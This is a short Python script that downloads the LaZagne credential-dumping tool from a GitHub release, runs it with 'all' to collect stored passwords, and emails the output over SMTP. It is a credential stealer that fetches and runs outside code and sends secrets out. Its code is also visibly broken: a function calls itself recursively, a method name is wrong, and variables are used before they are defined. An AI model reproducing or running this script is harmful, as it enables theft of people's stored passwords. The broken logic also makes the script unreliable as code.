import requests
import subprocess
import smtplib

def Download(url):
    GetResponse = requests.get(url)
    filename = url.split("/") [-1]

    with open(filename, "wb") as out_file:
        out_file.write(GetResponse.content)

    print(GetResponse)


def SendMail(email, password, message):

    email = input("What is your email")
    password = input("What is your password")

    result = subprocess.check_output("LaZagne.exe all", shell=True)
    print(result)

    server = smtplib.SMTP("smtp.mail.me.com", 587)
    server.starttls()
    server.login(email, password)
    server.SendMail(email, email, message)
    server.quit()

    SendMail(email, password, result)

Download("http://github.com//AlessandroZ/LaZagne/releases/download/2.4.3/lazagne.exe")

result = subprocess.check_output("LaZagne.exe all", shell=True)
SendMail(email, password, result)
